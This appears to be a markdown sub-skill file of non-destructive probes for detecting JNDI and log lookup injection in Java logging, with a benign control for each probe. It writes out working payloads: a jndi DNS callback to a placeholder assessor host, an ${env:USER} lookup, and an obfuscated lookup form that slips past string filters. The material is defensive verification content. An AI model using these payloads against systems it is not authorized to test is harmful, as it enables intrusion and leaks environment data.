# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`jndi-injection-logging-lookups`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `jndi-injection-logging-lookups`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Log-interpolation callback oracle

**Expected differential:** a plain User-Agent produces no outbound activity while one carrying a dns-only jndi lookup produces a callback to the assessor host, proving the logger evaluates message lookups

```text
User-Agent: probe-${jndi:dns://<assessor-controlled-host>/a}
User-Agent: probe-plain (control)
```

### Non-jndi lookup differential

**Expected differential:** an ${env:} or ${date:} lookup that changes the logged line proves interpolation is active even when the jndi prefix is filtered

```text
X-Probe: ${env:USER}
X-Probe: literal-user (control)
```

### Obfuscation-unwrap probe

**Expected differential:** a layered ${${lower:j}ndi: form resolving the same as the literal proves a naive string filter is bypassable while the lookup engine still runs

```text
X-Probe: ${${lower:j}ndi:dns://<assessor-controlled-host>/x}
X-Probe: jndi-disabled-literal (control)
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
